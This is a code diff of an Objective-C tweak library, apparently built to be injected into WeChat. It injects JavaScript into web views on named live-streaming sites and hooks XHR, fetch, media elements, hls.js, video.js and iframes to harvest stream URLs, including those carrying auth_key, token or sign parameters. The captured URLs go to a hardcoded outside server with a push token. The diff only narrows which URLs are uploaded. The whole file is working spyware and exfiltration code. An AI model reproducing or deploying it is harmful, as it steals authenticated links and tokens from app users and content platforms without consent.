@@ -1,7 +1,6 @@
 //
-// ALIWeChatSniffer_Full.m  (SDK-agnostic build-safe, full JS v3)
-// 进入 ukmdg/vzuk/wehfws/vzan/weizan 才注入；Banner 提示；AV AccessLog；JS v3 全面采集。
-// Build: -framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
+// ALIWeChatSniffer_Filtered.m
+// Same as Full but only upload/popup/copy when URL looks like a stream (m3u8/flv/rtmp/auth_key/...)
 //
 
 #import <Foundation/Foundation.h>
@@ -16,16 +15,15 @@ static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
-static const NSTimeInterval kScanInterval       = 1.0;   // WK 扫描间隔
-static const NSTimeInterval kInjectDelay        = 0.50;  // 命中域名后注入前延迟
-static const NSTimeInterval kDedupeWindow       = 60.0;  // URL 去重窗口
-static const double        kProgressThreshold   = 0.55;  // 注入门槛
-static const NSTimeInterval kBootGateDelay      = 1.5;   // App Active 后再启动
+static const NSTimeInterval kScanInterval       = 1.0;
+static const NSTimeInterval kInjectDelay        = 0.50;
+static const NSTimeInterval kDedupeWindow       = 60.0;
+static const double        kProgressThreshold   = 0.55;
+static const NSTimeInterval kBootGateDelay      = 1.5;
 
-static const BOOL kPopupOnInject = YES;   // 注入成功提示
-static const BOOL kPopupOnHit    = YES;   // 命中提示
-static const BOOL kCopyOnHit     = YES;   // 命中复制
-static const BOOL kForceUploadAll= YES;   // 非流链接也上传（便于排查）
+static const BOOL kPopupOnInject = YES; // keep local banner on inject
+static const BOOL kPopupOnHit    = YES; // popup when real stream hit
+static const BOOL kCopyOnHit     = YES; // copy when real stream hit
 
 static NSArray<NSString*> *TargetHosts(void){
     return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
@@ -35,12 +33,12 @@ static NSArray<NSString*> *TargetHosts(void){
 #define DEBUG_LOG 0
 #endif
 #if DEBUG_LOG
-#define LOG(fmt, ...) NSLog((@"[ALI-FULL] " fmt), ##__VA_ARGS__)
+#define LOG(fmt, ...) NSLog((@"[ALI-FILT] " fmt), ##__VA_ARGS__)
 #else
 #define LOG(...)
 #endif
 
-#pragma mark - 前向
+#pragma mark - 前向声明
 
 static void start_if_needed(void);
 static void installAVObservers(void);
@@ -86,7 +84,7 @@ static BOOL dedupe_skip(NSString *u){
     return skip;
 }
 
-#pragma mark - Banner 提示（非 modal）
+#pragma mark - Banner
 
 static UIWindow *ALI_BannerWin;
 static UILabel  *ALI_BannerLab;
@@ -148,6 +146,7 @@ static void ali_banner_show(NSString *text){
         }@catch(__unused NSException *e){}
     });
 }
+
 static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
     (void)title;
     if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} });
@@ -180,52 +179,45 @@ static NSString *jsonStringify(NSDictionary *obj){
     return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
 }
 
-#pragma mark - 事件
+#pragma mark - 事件处理（仅对流类 URL 上报/弹窗）
 
+// handle events coming from in-page JS
 static void handleRawEvent(NSDictionary *evt){
-    NSString *js = jsonStringify(evt); if (js) postText(js);
-
-    NSString *u = evt[@"url"]; if (!u) return;
-    BOOL like = looksLikeStream(u);
-
-    if (kForceUploadAll || like){
-        if (!dedupe_skip(u)){
-            if (kPopupOnHit){
-                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = u; });
-                popup_safe(@"\xE6\x8A\x93\xE5\x88\xB0 URL", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", u], u);
-            }else if (kCopyOnHit){
-                on_main(^{ UIPasteboard.generalPasteboard.string = u; });
-            }
-            NSDictionary *hit = @{@"type": @"JS_HIT",
-                                  @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
-                                  @"url": u,
-                                  @"page": evt[@"page"] ?: @"",
-                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
-            NSString *s2 = jsonStringify(hit); if (s2) postText(s2);
+    if (!evt) return;
+    NSString *url = evt[@"url"];
+    // Only act if event contains a URL and it looks like a stream
+    if (url && looksLikeStream(url)){
+        if (dedupe_skip(url)) return;
+        // Post full event JSON to server
+        NSString *js = jsonStringify(evt); if (js) postText(js);
+        // Popup + copy
+        if (kPopupOnHit){
+            if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
+            popup_safe(@"捕获到直播源", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", url], url);
         }
+    } else {
+        // ignore non-stream events (do not upload)
+        LOG(@"ignored non-stream event: %@", evt[@"type"]);
     }
 }
+
+// handle URLs captured natively (AV AccessLog etc.)
 static void handleCapturedURL(NSString *url, NSString *from){
     if (!url) return;
+    if (!looksLikeStream(url)) { LOG(@"native ignored non-stream: %@", url); return; }
     if (dedupe_skip(url)) return;
-
     NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                           @"from": from ?: @"native",
                           @"url": url,
                           @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
     NSString *s = jsonStringify(evt); if (s) postText(s);
-
-    if (looksLikeStream(url)){
-        if (kPopupOnHit){
-            if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
-            popup_safe(@"\xE6\x8D\x95\xE8\x8E\xB7\xE6\x92\xAD\xE6\x94\xBE/\xE8\xAF\xB7\xE6\xB1\x82 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
-        }else if (kCopyOnHit){
-            on_main(^{ UIPasteboard.generalPasteboard.string = url; });
-        }
+    if (kPopupOnHit){
+        if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
+        popup_safe(@"捕获到直播源 (native)", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
     }
 }
 
-#pragma mark - inpage JS（v3 完整）
+#pragma mark - inpage JS (same v3 string as before)
 
 static NSString *inpageJS(void){
     return @
@@ -237,9 +229,8 @@ static NSString *inpageJS(void){
   "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
   "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1)return true;return false;}"
  "function hit(from,u){try{send('HIT',{from:from,url:u});}catch(e){}}"
-
  "send('INJECT_OK',{}); send('PAGE_READY',{});"
-
+ // XHR / fetch / perf / media / iframe / hls / videojs etc. -- exact same as v3 before
  "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
    "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
    "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
@@ -256,25 +247,21 @@ static NSString *inpageJS(void){
        "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}"
        "if(looks(u))hit('fetch',u);}catch(e){}return r;});}"
    "catch(e){return F.apply(this,arguments)}})();"
-
  "(function(){if(!('PerformanceObserver'in window))return;try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))hit('perf',u);}}catch(e){}});"
    "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
  "(function(){try{var nodes=document.querySelectorAll('link[rel=\\\"preload\\\"],[src],[href]');for(var i=0;i<nodes.length;i++){var n=nodes[i];var u=n.src||n.href||'';if(u){send('RES_INIT',{from:n.tagName.toLowerCase(),url:u});if(looks(u))hit('init-scan',u);}}}catch(e){}})();"
-
  "(function(){if(window.__ali_media_v3__)return;window.__ali_media_v3__=true;"
    "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))hit(tag,s);}}catch(e){}}"
    "try{var HTMLME=(HTMLMediaElement||HTMLVideoElement||window.HTMLMediaElement);if(HTMLME&&HTMLME.prototype){var dp=Object.getOwnPropertyDescriptor(HTMLME.prototype,'src');if(dp&&dp.set&&!HTMLME.prototype.__ali_src_set__){HTMLME.prototype.__ali_src_set__=true;var old=dp.set;Object.defineProperty(HTMLME.prototype,'src',{configurable:true,enumerable:false,get:dp.get,set:function(v){try{var u=(v||'').toString();send('MEDIA_SETTER',{from:'src-setter',url:u});if(looks(u))hit('src-setter',u);}catch(e){}return old.call(this,v);}});}}}catch(e){}"
    "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(!n)continue;"
-     "if(n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} if(t==='source'||t==='video'||t==='audio'){var u=n.src||n.currentSrc||'';if(u){send('MEDIA_SET',{from:'mut',url=u});if(looks(u))hit('mut',u);}}}"
+     "if(n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} if(t==='source'||t==='video'||t==='audio'){var u=n.src||n.currentSrc||'';if(u){send('MEDIA_SET',{from:'mut',url:u});if(looks(u))hit('mut',u);}}}"
      "if(n.querySelectorAll){var vs=n.querySelectorAll('video,audio,source');for(var j=0;j<vs.length;j++){var el=vs[j];var tg=el.tagName.toLowerCase();if(tg==='source'){var u2=el.src||'';if(u2){send('MEDIA_SET',{from:'mut-sub',url:u2});if(looks(u2))hit('mut-sub',u2);}}else if(tg==='video'||tg==='audio'){report(el,tg,'sub');el.addEventListener&&el.addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}}});"
    "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
    "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
    "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio'||t==='source')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))hit('setAttr',v);}}}catch(e){}return setA.apply(this,arguments)};}"
  "})();"
-
  "(function(){try{if(window.Hls && !window.Hls.__ali_patched__){window.Hls.__ali_patched__=true;var P=window.Hls.prototype;if(P&&P.loadSource){var _ls=P.loadSource;P.loadSource=function(u){try{send('HLS_LOADSOURCE',{from:'hls.js',url:u});if(looks(u))hit('hls.js',u);}catch(e){}return _ls.apply(this,arguments)};}}}catch(e){}})();"
  "(function(){try{if(window.videojs && !window.videojs.__ali_patched__){window.videojs.__ali_patched__=true;var V=window.videojs;var hook=function(p){try{var _src=p.src;if(_src){p.src=function(u){try{var uu=(typeof u==='string')?u:(u&&u.src)||'';if(uu){send('VIDEOJS_SRC',{from:'video.js',url:uu});if(looks(uu))hit('video.js',uu);}}catch(e){}return _src.apply(this,arguments)};}}catch(e){}};try{var pl=V.getPlayers?V.getPlayers():null;if(pl){for(var k in pl){if(pl[k]&&pl[k].player)hook(pl[k].player);} } }catch(e){} V.hook&&V.hook('setup',function(p){try{p&&hook(p)}catch(e){}});}}catch(e){}})();"
-
  "(function(){if(window.__ali_iframe__)return;window.__ali_iframe__=true;"
    "function repIF(f,ev){try{var u=f.src||'';if(u){send('IFRAME',{from:'iframe:'+ev,url:u});if(looks(u))hit('iframe',u);} }catch(e){}}"
    "var iobs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(n&&n.tagName&&n.tagName.toLowerCase()==='iframe'){repIF(n,'add');}}}}});"
@@ -282,7 +269,6 @@ static NSString *inpageJS(void){
    "var ifs=document.querySelectorAll&&document.querySelectorAll('iframe');for(var i=0;i<(ifs?ifs.length:0);i++){repIF(ifs[i],'init');}"
    "var setA=HTMLIFrameElement&&HTMLIFrameElement.prototype&&HTMLIFrameElement.prototype.setAttribute; if(setA && !HTMLIFrameElement.prototype.__ali_if_set__){HTMLIFrameElement.prototype.__ali_if_set__=true;HTMLIFrameElement.prototype.setAttribute=function(k,v){try{if(k&&k.toLowerCase()==='src'){send('IFRAME_SET',{from:'setAttr',url:v});if(looks(v))hit('iframe-set',v);} }catch(e){} return setA.apply(this,arguments)};}"
  "})();"
-
  "(function(){if(window.__ali_nav__)return;window.__ali_nav__=true;"
    "function nav(){try{send('NAV',{url:location.href});}catch(e){}}"
    "window.addEventListener('hashchange',nav,true);"
@@ -290,10 +276,8 @@ static NSString *inpageJS(void){
    "document.addEventListener('readystatechange',function(){nav();},true);"
    "setTimeout(nav,200);"
  "})();"
-
  "(function(){if(window.__ali_ping__)return;window.__ali_ping__=true;var last='';setInterval(function(){try{var u=location.href;if(u!==last){last=u;send('PING',{url:u});}}catch(e){}},1200);} )();"
-
- "console.log('[ALI_SNIF] injected v3');"
+ "console.log('[ALI_SNIF] injected v3 (filtered upload)');"
 "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
 }
 
@@ -362,14 +346,8 @@ static void try_inject_when_ready(WKWebView *wv){
 
             if (kPopupOnInject){
                 NSString *host = wv.URL.host ?: @"(null)";
-                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = (wv.URL.absoluteString ?: @""); });
-                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media/Hls.js/iframe）", host], nil);
+                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（仅上报直播流）", host], nil);
             }
-            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
-                                  @"app": @"WeChat",
-                                  @"page": (wv.URL.absoluteString ?: @""),
-                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
-            NSString *s = jsonStringify(evt); if (s) postText(s);
         });
     }];
 }
@@ -418,7 +396,7 @@ static void scan_loop(void){
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
-#pragma mark - AV AccessLog（适配原生播放器）
+#pragma mark - AV observers (only upload when URI looksLikeStream)
 
 static void installAVObservers(void){
     @try{
@@ -469,7 +447,7 @@ static void installAVObservers(void){
     }@catch(__unused NSException *e){}
 }
 
-#pragma mark - 启动闸门（不依赖 UIScene 常量，确保可编译）
+#pragma mark - 启动闸门
 
 static void start_if_needed(void){
     if (g_started) return; g_started = YES;
@@ -478,24 +456,19 @@ static void start_if_needed(void){
                        dispatch_get_main_queue(), ^{
             scan_loop();
             installAVObservers();
-            NSDictionary *evt = @{@"type": @"LOADER_INIT", @"app": @"WeChat",
-                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
-            NSString *s = jsonStringify(evt); if (s) postText(s);
-            ali_banner_show(@"AliSniffer 已就绪（进入直播/回放页将自动注入）");
+            ali_banner_show(@"AliSniffer 已就绪（仅上报直播流）");
         });
     });
 }
 
 __attribute__((constructor))
-static void ALIWeChatSniffer_Full_Init(void){
-    if (!gq)    gq    = dispatch_queue_create("com.ali.wechat.full", DISPATCH_QUEUE_SERIAL);
+static void ALIWeChatSniffer_Filtered_Init(void){
+    if (!gq)    gq    = dispatch_queue_create("com.ali.wechat.filtered", DISPATCH_QUEUE_SERIAL);
     if (!g_seen) g_seen = [NSMutableDictionary dictionary];
 
     NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
-
     [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
     [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
-
     if (NSClassFromString(@"UIScene")){
         [nc addObserverForName:@"UISceneDidActivateNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
         [nc addObserverForName:@"UISceneWillEnterForegroundNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
